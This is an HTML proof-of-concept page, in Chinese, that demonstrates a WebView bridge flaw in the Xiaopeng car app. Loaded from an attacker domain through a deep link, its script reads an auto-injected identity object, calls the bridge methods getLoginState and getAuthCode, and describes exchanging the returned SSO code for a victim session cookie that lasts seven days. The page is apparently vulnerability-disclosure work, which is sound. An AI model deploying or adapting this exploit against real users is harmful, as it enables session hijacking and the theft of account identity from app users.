<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>安全测试</title>
<style>
  body{font-family:-apple-system,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:16px;font-size:14px}
  h3{color:#ff6b6b;margin:8px 0 12px;font-size:16px}
  .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;margin-bottom:10px}
  .card h4{margin:0 0 8px;font-size:14px;color:#58a6ff}
  pre{background:#0a0e14;border-radius:6px;padding:8px;white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:240px;overflow:auto;margin:0;color:#7ee787}
  .ok{color:#7ee787}.fail{color:#ff7b72}.dim{color:#8b949e}
  #origin{color:#ffa657;word-break:break-all}
</style>
</head>
<body>
<h3>⚠️ 小鹏国内版App WebView 越权演示（只读）</h3>
<div class="card"><h4>当前页面真实来源（攻击者域）</h4><pre id="origin">…</pre></div>
<div class="card"><h4>① 自动注入身份 <span class="dim">__xp_info__（零调用）</span></h4>
  <pre id="r0">自动读取中…</pre></div>
<div class="card"><h4>② 桥方法（本域仅当白名单放行时可用）</h4>
  <pre id="r1">探测中…</pre>
  <div class="dim" id="hint"></div></div>
<div class="card"><h4>③ SSO授权码 → 会话接管</h4>
  <pre id="r2"></pre>
  <div class="dim">授权码兑换：GET &lt;目标appId&gt;/webAuthSdk/callback?state=x&amp;code=&lt;code&gt; → 种受害者会话cookie（7天）</div></div>
<script>
function log(id,s){document.getElementById(id).textContent=s;}
document.getElementById('origin').textContent='location.origin = '+location.origin+'\n(攻击者域, 与 xiaopeng.com 无关; 经 /common/webview?url= DeepLink 打开)';
setTimeout(function(){
  var xi=window.__xp_info__;
  if(xi){log('r0','✔ 泄露成功(零调用): '+JSON.stringify(xi));}
  else{log('r0','✗ __xp_info__ 未注入(容器/时机)');}
},1500);
var CB=0;
function call(m,d,rid){
  var st='__cb_'+(++CB);
  window[st]=function(v){delete window[st];log(rid,'✔ ['+m+'] '+(typeof v==='string'?v:JSON.stringify(v)));};
  try{
    var s=window._dsbridge.call(m,JSON.stringify({data:d||{},_dscbstub:st}));
    if(s&&s.indexOf('"code":-2')>=0){log(rid,'✗ ['+m+'] 白名单拒绝(-2): '+s);
      document.getElementById('hint').textContent='本域 host 不在桥白名单 → 桥拒(-2)。加载闸已绕过(本页能打开即证明); 桥全方法演示需 localhost 版(见 localhost-poc.html + README-POC-CN.md)';}
    else if(s&&s.indexOf('"code":-1')>=0){/*异步等回调*/}
    else if(s){log(rid,'sync ['+m+'] '+s);}
  }catch(e){log(rid,'✗ ['+m+'] '+e);}
  setTimeout(function(){if(window[st]){delete window[st];}},8000);
}
setTimeout(function(){ if(window._dsbridge){ call('getLoginState',{},'r1'); } else { log('r1','无 _dsbridge 对象'); } },2500);
setTimeout(function(){ if(window._dsbridge){ call('getAuthCode',{target:'xp_digitalservice_insurance'},'r2'); } },4000);
</script>
</body>
</html>
